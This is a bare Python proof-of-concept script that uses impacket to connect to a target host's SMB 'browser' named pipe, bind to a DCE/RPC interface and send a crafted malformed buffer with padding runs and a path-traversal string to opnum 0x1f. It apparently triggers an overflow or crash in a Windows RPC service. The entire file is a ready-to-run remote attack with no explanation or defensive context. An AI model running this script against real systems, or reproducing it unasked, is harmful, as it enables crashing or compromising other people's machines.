#!/usr/bin/python
import sys
from impacket import smb
from impacket import uuid
from impacket.dcerpc import dcerpc
from impacket.dcerpc import transport

host = sys.argv[1]
port = 445

t = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % host)
t.connect()
dce = t.DCERPC_class(t)
dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
buffer = "\x01\x00\x00\x00"
buffer += "\xFC\x00\x00\x00"
buffer += "\x00\x00\x00\x00"
buffer += "\xFC\x00\x00\x00"
buffer += "B" * 500
buffer += "\x00\x00\x00\x00"
buffer += "\x2f\x00\x00\x00"
buffer += "\x00\x00\x00\x00"
buffer += "\x2f\x00\x00\x00"
buffer += "\x41\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00"
buffer += "A" * 74
buffer += "\x00\x00\x00\x00\x00\x00"
buffer += "\x02\x00\x00\x00"
buffer += "\x02\x00\x00\x00"
buffer += "\x00\x00\x00\x00"
buffer += "\x02\x00\x00\x00"
buffer += "\x5c\x00\x00\x00"
buffer += "\x01\x00\x00\x00"
buffer += "\x01\x00\x00\x00"
dce.call(0x1f, buffer)
